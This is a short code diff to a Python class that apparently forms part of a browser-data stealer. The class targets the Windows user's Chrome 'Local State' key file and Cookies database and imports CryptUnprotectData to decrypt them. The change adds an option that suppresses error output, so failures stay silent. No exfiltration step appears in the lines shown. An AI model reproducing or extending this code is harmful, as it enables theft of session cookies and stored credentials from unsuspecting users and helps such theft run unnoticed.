@@ -11,10 +11,11 @@ from win32crypt import CryptUnprotectData
 
 class Chrome:
 
-    def __init__(self, storage_path: str, storage_folder: str):
+    def __init__(self, storage_path: str, storage_folder: str, errors_print: bool):
 
         self.storage_path = storage_path
         self.storage_folder = storage_folder
+        self.errors_print = errors_print
 
         self.state_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\Local State'
         self.cookies_path = environ['USERPROFILE'] + sep + r'AppData\Local\Google\Chrome\User Data\default\Cookies'
@@ -83,4 +84,11 @@ class Chrome:
             remove(f"{self.storage_path}Chrome.db")
 
         except Exception as e:
-            print(repr(e))
+
+            if self.errors_print is True:
+
+                print(f"[CHROME]: {repr(e)}")
+
+            else:
+
+                pass
